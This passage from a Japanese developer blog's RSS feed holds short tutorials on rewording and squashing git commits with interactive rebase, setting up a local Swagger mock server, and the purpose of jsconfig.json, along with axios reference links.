&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://tositeru.github.io/Notebook/js/axios.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;axios&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.yoheim.net/blog.php?q=20170801&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[フロントエンド] axiosライブラリを使って、柔軟にHTTP通信を行う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.softel.co.jp/blogs/tech/archives/6611&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【JavaScript】axiosのエラーを共通の処理で拾う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://zenn.dev/aya_ryo/articles/d89d7be695d063&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【JavaScript】axiosのエラーを共通の処理で拾う&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.sukerou.com/2019/05/axios.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;axiosの使い方まとめ (GET/POST/例外処理)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://r17n.page/2020/02/04/nodejs-axios-file-upload-api/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;axios で添付ファイルありのリクエスト(multipart/form-data の POST)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://reiji1020.hatenablog.com/entry/2018/12/31/113202&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【React】axiosを使用してmultipart/form-data形式の通信をする&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>コミットメッセージを変更する</title>
        <link>https://tadakun8.github.io/post/git-change-commit-message/</link>
        <pubDate>Sun, 13 Jun 2021 09:16:53 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/git-change-commit-message/</guid>
        <description>&lt;img src="https://tadakun8.github.io/post/git-change-commit-message/git.png" alt="Featured image of post コミットメッセージを変更する" /&gt;&lt;h2 id=&#34;はじめに&#34;&gt;はじめに&lt;/h2&gt;
&lt;p&gt;開発が進んでいくと、コミットメッセージを変更したいなぁということがあると思います。また、「このコミットメッセージわかりにくい」と言われることもあるでしょう。特に、2つ以上前のコミットメッセージを変える方法はいつも調べているので、記事にしました。&lt;/p&gt;
&lt;h2 id=&#34;直近のコミットメッセージを変更する場合&#34;&gt;直近のコミットメッセージを変更する場合&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;git commit --amend&lt;/code&gt;で修正できます&lt;/p&gt;
&lt;h3 id=&#34;想定するケース&#34;&gt;想定するケース&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
c7c87bd commit 4 ← 番号がずれてしまった
8b72c5c commit 2
13ba7d2 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直近のコミットメッセージの番号がずれていますので、commit 4 を commit 3に修正しましょう&lt;/p&gt;
&lt;h3 id=&#34;修正&#34;&gt;修正&lt;/h3&gt;
&lt;p&gt;直近のコミットメッセージを変更する場合は以下のコマンドですぐ変更できます&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ git commit --amend
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;そうするとvimが起動するので、commit 4 を commit 3に変更しましょう。&lt;/p&gt;
&lt;p&gt;変更後に確認すると、意図した結果になってます&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
af9e74a commit 3
8b72c5c commit 2
13ba7d2 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2つ以上前のコミットメッセージを変更する場合&#34;&gt;2つ以上前のコミットメッセージを変更する場合&lt;/h2&gt;
&lt;p&gt;いよいよ本題です。こちらは&lt;code&gt;git rebase&lt;/code&gt;を使って修正します。&lt;/p&gt;
&lt;h3 id=&#34;想定するケース-1&#34;&gt;想定するケース&lt;/h3&gt;
&lt;p&gt;コミットの履歴を以下だとしましょう&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
0638aca commit 5
cb1a280 commit 4
2572e35 commit 3
b1ce602 commit 22
13ba7d2 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;commit 2 のつもりが commit 22 となっています&lt;/p&gt;
&lt;h3 id=&#34;修正-1&#34;&gt;修正&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# commit 1のコミットIDを引数にし、commit 22までをrebaseの範囲とする&lt;/span&gt;
$ git reabase -i 13ba7d2 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;vimが立ち上がるので、commit 22の pick を &lt;strong&gt;r(またはreword)&lt;/strong&gt; に変更します&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- pick b1ce602 commit 22
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ r b1ce602 commit 22
&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;pick 2572e35 commit 3
pick cb1a280 commit 4
pick 0638aca commit 5

# Rebase 13ba7d2..0638aca onto 0638aca (4 commands)
#
# Commands:
# p, pick &amp;lt;commit&amp;gt; = use commit
# r, reword &amp;lt;commit&amp;gt; = use commit, but edit the commit message
# e, edit &amp;lt;commit&amp;gt; = use commit, but stop for amending
# s, squash &amp;lt;commit&amp;gt; = use commit, but meld into previous commit
# f, fixup &amp;lt;commit&amp;gt; = like &amp;#34;squash&amp;#34;, but discard this commit&amp;#39;s log message
# x, exec &amp;lt;command&amp;gt; = run command (the rest of the line) using shell
# b, break = stop here (continue rebase later with &amp;#39;git rebase --continue&amp;#39;)
# d, drop &amp;lt;commit&amp;gt; = remove commit
# l, label &amp;lt;label&amp;gt; = label current HEAD with a name
# t, reset &amp;lt;label&amp;gt; = reset HEAD to a label
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;確認すると意図した結果になっていますね&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
9f6ecb5 commit 5
bbf2396 commit 4
4d7d435 commit 3
f5312fb commit 2
13ba7d2 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;このあとは&#34;&gt;このあとは・・・？&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;push&lt;/code&gt;してリモートリポジトリを随時更新してください。コミットの履歴を変えたので、&lt;code&gt;git push -f&lt;/code&gt;でないとpushできないので、お気をつけて。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>commitをまとめる</title>
        <link>https://tadakun8.github.io/post/git-put-together-commits/</link>
        <pubDate>Sat, 12 Jun 2021 20:58:32 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/git-put-together-commits/</guid>
        <description>&lt;img src="https://tadakun8.github.io/post/git-put-together-commits/git.png" alt="Featured image of post commitをまとめる" /&gt;&lt;h3 id=&#34;はじめに&#34;&gt;はじめに&lt;/h3&gt;
&lt;p&gt;コミットのまとめ方を毎回調べているのでメモ&lt;/p&gt;
&lt;h3 id=&#34;直前のコミットをまとめる場合&#34;&gt;直前のコミットをまとめる場合&lt;/h3&gt;
&lt;p&gt;現在のコミットが以下だと仮定します&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
7a0470f commit 5
ce15d24 commit 4
346c3f2 commit 3
894afa7 commit 2
31bea46 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;ul&gt;
&lt;li&gt;--oneline : 各コミットを1行で表示する&lt;/li&gt;
&lt;li&gt;--no-decorate : 余計な装飾を消す &lt;sup id=&#34;fnref:1&#34;&gt;&lt;a href=&#34;#fn:1&#34; class=&#34;footnote-ref&#34; role=&#34;doc-noteref&#34;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;以下の状態になるようにコミットをまとめてみましょう&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
d8feda4 commit 5、4、3をまとめました
894afa7 commit 2
31bea46 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;手順&#34;&gt;手順&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git rebase -i HEAD~3 &lt;span class=&#34;c1&#34;&gt;# 直前の3つコミットをrebase&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;何も設定していなければvimが起動し、以下が表示されます&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git rebase -i HEAD~3         [master]
hint: Waiting for your editor to close the file... 
pick 346c3f2 commit 3
pick ce15d24 commit 4
pick 7a0470f commit 5

# Rebase 894afa7..7a0470f onto 894afa7 (3 commands)
#
# Commands:
# p, pick &amp;lt;commit&amp;gt; = use commit
# r, reword &amp;lt;commit&amp;gt; = use commit, but edit the commit message
# e, edit &amp;lt;commit&amp;gt; = use commit, but stop for amending
# s, squash &amp;lt;commit&amp;gt; = use commit, but meld into previous commit
# f, fixup &amp;lt;commit&amp;gt; = like &amp;quot;squash&amp;quot;, but discard this commit&#39;s log message
# x, exec &amp;lt;command&amp;gt; = run command (the rest of the line) using shell
# b, break = stop here (continue rebase later with &#39;git rebase --continue&#39;)
# d, drop &amp;lt;commit&amp;gt; = remove commit
# l, label &amp;lt;label&amp;gt; = label current HEAD with a name
# t, reset &amp;lt;label&amp;gt; = reset HEAD to a label
# m, merge [-C &amp;lt;commit&amp;gt; | -c &amp;lt;commit&amp;gt;] &amp;lt;label&amp;gt; [# &amp;lt;oneline&amp;gt;]
# .       create a merge commit using the original merge commit&#39;s
# .       message (or the oneline, if no original merge commit was
# .       specified). Use -c &amp;lt;commit&amp;gt; to reword the commit message.
#
# These lines can be re-ordered; they are executed from top to bottom.
#
# If you remove a line here THAT COMMIT WILL BE LOST.
#
# However, if you remove everything, the rebase will be aborted.
#
# Note that empty commits are commented out
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;次に、まとめたいコミットを pick から &lt;strong&gt;s(またはsquash)&lt;/strong&gt; に変更します。イメージ的にはcommit 4とcommit 5をcommit 3にまとめるようなイメージです&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;pick 346c3f2 commit 3
&lt;span class=&#34;gd&#34;&gt;- pick ce15d24 commit 4
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;- pick 7a0470f commit 5
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;
pick 346c3f2 commit 3
&lt;span class=&#34;gi&#34;&gt;+ s ce15d24 commit 4
&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ s 7a0470f commit 5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;保存すると、まとめたコミットのコミットメッセージを入力する画面が表示されます&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash:表示される画面&#34; data-lang=&#34;bash:表示される画面&#34;&gt;# This is a combination of 3 commits.
# This is the 1st commit message:

commit 3

# This is the commit message #2:

commit 4

# This is the commit message #3:

commit 5
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;#&lt;/code&gt;が&lt;strong&gt;ついていないもの&lt;/strong&gt;がコミットメッセージとして適用されます。なので今回はこれらを消して以下のメッセージに修正します&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;commit 5、4、3をまとめました
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;これで保存すると想定通りコミットがまとまりました&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate                                                                         
d8feda4 commit 5、4、3をまとめました
894afa7 commit 2
31bea46 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;離れたコミットをまとめる場合&#34;&gt;離れたコミットをまとめる場合&lt;/h3&gt;
&lt;p&gt;現在のコミットが以下だと仮定します&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
7a0470f commit 5
ce15d24 commit 4
346c3f2 commit 3
894afa7 commit 2
31bea46 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以下の状態になるようにコミットをまとめてみましょう&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate
7a0470f commit 5
ce15d24 commit 4
bc9ff20 commit 2, 3をまとめました
894afa7 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;手順-1&#34;&gt;手順&lt;/h4&gt;
&lt;p&gt;手順としては先ほどと同様です。イメージとしてはcommit3をコミット2にまとめるようなイメージを持ってください。なので、commit3のpickをs(squash)に変更してあげましょう。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ git rebase -i 894afa7 &lt;span class=&#34;c1&#34;&gt;# 引数にコミットIDを指定するとその次のコミット(ここではcommit2)までがrebaseの範囲になる&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;表示されるvim画面は以下になります&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pick 894afa7 commit 2
pick 346c3f2 commit 3
pick ce15d24 commit 4
pick 7a0470f commit 5

# Rebase 31bea46..7a0470f onto 7a0470f (4 commands)
#
# Commands:
# p, pick &amp;lt;commit&amp;gt; = use commit
# r, reword &amp;lt;commit&amp;gt; = use commit, but edit the commit message
# e, edit &amp;lt;commit&amp;gt; = use commit, but stop for amending
# s, squash &amp;lt;commit&amp;gt; = use commit, but meld into previous commit
# f, fixup &amp;lt;commit&amp;gt; = like &amp;quot;squash&amp;quot;, but discard this commit&#39;s log message
# x, exec &amp;lt;command&amp;gt; = run command (the rest of the line) using shell
# b, break = stop here (continue rebase later with &#39;git rebase --continue&#39;)
# d, drop &amp;lt;commit&amp;gt; = remove commit
# l, label &amp;lt;label&amp;gt; = label current HEAD with a name
# t, reset &amp;lt;label&amp;gt; = reset HEAD to a label
# m, merge [-C &amp;lt;commit&amp;gt; | -c &amp;lt;commit&amp;gt;] &amp;lt;label&amp;gt; [# &amp;lt;oneline&amp;gt;]
# .       create a merge commit using the original merge commit&#39;s
# .       message (or the oneline, if no original merge commit was
# .       specified). Use -c &amp;lt;commit&amp;gt; to reword the commit message.
#

&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;いつものようにまとめたいコミットの pick を &lt;strong&gt;s(またはsquash)&lt;/strong&gt; に変更しましょう&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;pick 894afa7 commit 2
&lt;span class=&#34;gd&#34;&gt;- pick 346c3f2 commit 3
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;pick ce15d24 commit 4
pick 7a0470f commit 5

pick 894afa7 commit 2
&lt;span class=&#34;gi&#34;&gt;+ s 346c3f2 commit 3
&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;pick ce15d24 commit 4
pick 7a0470f commit 5
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;保存して、コミットメッセージを&lt;code&gt;commit 2, 3をまとめました&lt;/code&gt;と書けば想定した結果になるはずです&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[~/workspace/sample] 
❯❯❯ git log --oneline --no-decorate                                                                        
f5cade0 commit 5
04ac645 commit 4
bc9ff20 commit 2, 3をまとめました
31bea46 commit 1
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;このあとは&#34;&gt;このあとは・・・？&lt;/h3&gt;
&lt;p&gt;変更が終わったら、リモートリポジトリにpushしましょう。&lt;/p&gt;
&lt;p&gt;ただ、rebaseした後にリモートリポジトリにpushしようとするとエラーがでます。ローカルとリモートの履歴が異なるので当たり前ですね。その場合は&lt;code&gt;git push -f origin ブランチ名&lt;/code&gt;でpushできます。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ただし、&lt;code&gt;git push -f&lt;/code&gt; はリモートリポジトリに現在のブランチの状態を強制的にpushします。&lt;strong&gt;リモートリポジトリの状態を強制的に変更するコマンド&lt;/strong&gt;なので、必ず今の変更があっているかを確かめてから使うようにしてください。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/takke/items/3400b55becfd72769214&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;rebase -i でコミットをまとめる&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://qiita.com/tatetate55/items/7a822a3246df79d693b8&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;git rebase -iでgitのコミットをまとめる&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;section class=&#34;footnotes&#34; role=&#34;doc-endnotes&#34;&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id=&#34;fn:1&#34; role=&#34;doc-endnote&#34;&gt;
&lt;p&gt;このオプションをつけないと最新のcommitが&lt;code&gt;7a0470f (HEAD -&amp;gt; master) commit 5&lt;/code&gt;と表示されます。ここでは表示をわかりやすくするために、このオプションをつけました&amp;#160;&lt;a href=&#34;#fnref:1&#34; class=&#34;footnote-backref&#34; role=&#34;doc-backlink&#34;&gt;&amp;#x21a9;&amp;#xfe0e;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/section&gt;
</description>
        </item>
        <item>
        <title>Swaggerでモックサーバを立てる</title>
        <link>https://tadakun8.github.io/post/creating-a-mock-server-with-swagger/</link>
        <pubDate>Thu, 10 Jun 2021 21:15:14 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/creating-a-mock-server-with-swagger/</guid>
        <description>&lt;img src="https://tadakun8.github.io/post/creating-a-mock-server-with-swagger/swagger.jpg" alt="Featured image of post Swaggerでモックサーバを立てる" /&gt;&lt;h3 id=&#34;はじめに&#34;&gt;はじめに&lt;/h3&gt;
&lt;p&gt;ここでは、Swaggerで定義したAPIからモックサーバを立てる方法を書いていきます。SwaggerのDockerイメージを利用してモックサーバを構築する方法もありますが、ここではSwagger Editorを使用する方法について書きます。&lt;/p&gt;
&lt;h3 id=&#34;手順&#34;&gt;手順&lt;/h3&gt;
&lt;h4 id=&#34;モックサーバファイルをダウンロード&#34;&gt;モックサーバファイルをダウンロード&lt;/h4&gt;
&lt;p&gt;モックサーバをローカルで立ち上げるために必要なファイルをダウンロードします&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;まずは&lt;a class=&#34;link&#34; href=&#34;https://editor.swagger.io/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;swagger editor&lt;/a&gt;にアクセスしてください&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;上部の&lt;strong&gt;Generate Server&lt;/strong&gt;をクリックしてどの言語でモックサーバを立てるかを選んでください&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;この記事では&lt;code&gt;nodejs-server&lt;/code&gt;を選択した想定で進みます&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;選択するとzipファイルがダウンロードされるので、任意のフォルダで展開してください&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;swaggeryamlを修正&#34;&gt;swagger.yamlを修正&lt;/h4&gt;
&lt;p&gt;ローカルでAPIを叩けるようにするために、&lt;code&gt;api/swagger.yaml&lt;/code&gt;を変更する必要があります。
具体的にはappフォルダにある&lt;code&gt;swagger.yaml&lt;/code&gt;の&lt;code&gt;host&lt;/code&gt;と&lt;code&gt;schemas&lt;/code&gt;の値を変更します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-diff&#34; data-lang=&#34;diff&#34;&gt;&lt;span class=&#34;gd&#34;&gt;- host: &amp;#34;petstore.swagger.io&amp;#34;
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;+ host: &amp;#34;localhost:8080&amp;#34;
&lt;/span&gt;&lt;span class=&#34;gi&#34;&gt;&lt;/span&gt;
schemes:
&lt;span class=&#34;gd&#34;&gt;- &amp;#34;https&amp;#34; ← これを消す
&lt;/span&gt;&lt;span class=&#34;gd&#34;&gt;- &amp;#34;http&amp;#34;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;必要なモジュールのインストール&#34;&gt;必要なモジュールのインストール&lt;/h4&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ npm install
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;展開したディレクトリの&lt;code&gt;package.json&lt;/code&gt;があるディレクトリ内でこのコマンドを叩いてください&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;モックサーバを立ち上げる&#34;&gt;モックサーバを立ち上げる&lt;/h4&gt;
&lt;p&gt;同じディレクトリで以下のコマンドを叩いてサーバを立ち上げます&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ npm run start
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;http://localhost:8080/docs/&lt;/code&gt;にアクセスすると、Swagger UIが立ち上がるはずです。Swagger UIで試してみても良いですし、ブラウザの検索窓から&lt;code&gt;http://localhost:8080/v2/pet/3&lt;/code&gt;と叩けばjsonのレスポンスが返ってくることを確認できるはずです&lt;/p&gt;
&lt;h3 id=&#34;このあとは&#34;&gt;このあとは・・・？&lt;/h3&gt;
&lt;p&gt;この手順で使用したAPIはSwagger Editor用意したサンプルのAPIになります。&lt;code&gt;swagger.yaml&lt;/code&gt;を修正し、プロジェクトに必要なAPIを定義していけばよいでしょう。&lt;/p&gt;
&lt;p&gt;また、フロントエンドの確認をしたい場合はリクエスト先を&lt;code&gt;http://localhost:8080/v2/pet/3&lt;/code&gt;のようにしてあげれば、バックエンドが実装されていなくても、フロントエンドの確認をすることができますね！&lt;/p&gt;
&lt;p&gt;Swagger本来の用途であるAPI仕様書としても使用できるので、このフォルダをgit管理してプロジェクトで共有するということをおすすめします。&lt;/p&gt;
&lt;h3 id=&#34;参考&#34;&gt;参考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://mather.hatenablog.jp/entry/swagger-mock&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;外部連携APIのモックサーバをSwaggerを利用して作る&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>jsconfig.jsonとは？</title>
        <link>https://tadakun8.github.io/post/what-is-jsconfig-json/</link>
        <pubDate>Thu, 10 Jun 2021 19:59:50 +0900</pubDate>
        
        <guid>https://tadakun8.github.io/post/what-is-jsconfig-json/</guid>
        <description>&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;jsconfig.jsonとはvscodeでjavascriptを書くときに便利にコーディングできるようにする設定ファイルのことです&lt;/p&gt;
&lt;h3 id=&#34;example&#34;&gt;example&lt;/h3&gt;
&lt;p&gt;以下は、&lt;code&gt;create-nuxt-app&lt;/code&gt;コマンドで作成されたjsconfig.jsonの例&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript:jsconfig.json&#34; data-lang=&#34;javascript:jsconfig.json&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;compilerOptions&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;baseUrl&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
        &lt;span class=&#34;nt&#34;&gt;&amp;#34;paths&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;~/*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;@/*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;~~/*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt;
            &lt;span class=&#34;nt&#34;&gt;&amp;#34;@@/*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./*&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
    &lt;span class=&#34;p&#34;&gt;},&lt;/span&gt;
    &lt;span class=&#34;nt&#34;&gt;&amp;#34;exclude&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;node_modules&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;.nuxt&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;dist&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;remarks&#34;&gt;Remarks&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;typescriptの場合はtsconfig.jsonになる&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;reference&#34;&gt;Reference&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://code.visualstudio.com/docs/languages/jsconfig&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;jsconfig.json(公式ページ)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://marsquai.com/a70497b9-805e-40a9-855d-1826345ca65f/1dc3824a-2ab9-471f-ad58-6226a37245ce/b5ce5f32-2afa-41f5-9fae-a3979f5c13df/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【TypeScript】TSConfigの基礎&lt;/a&gt;&lt;/li&gt;
